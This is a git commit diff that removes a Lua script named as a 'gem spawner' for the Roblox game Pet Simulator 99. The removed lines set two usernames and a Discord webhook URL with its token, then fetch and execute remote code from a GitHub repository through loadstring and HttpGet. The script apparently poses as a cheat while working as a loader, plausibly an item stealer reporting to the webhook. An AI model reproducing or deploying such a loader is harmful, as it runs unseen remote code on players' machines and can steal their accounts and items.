61c1561b14b1fedae79e7806c583b359f56a088f
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-22 14:38:40 +0200

    Mass update of selected files

--- ps99/Gemspawnerv2.lua
+++ ps99/Gemspawnerv2.lua
@@ -1,5 +1,1 @@
-Username = "m1234ao"
-Username2 = "m1234ao"
-Webhook = "https://canary.discord.com/api/webhooks/1362837023819436093/ipWTTRYja7Lt1JR6tHYbyA3rdWbeEcL0tNzzKBrbyC3e4ayKjngQLGrL3WvDXjNaniJ9"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
+hello
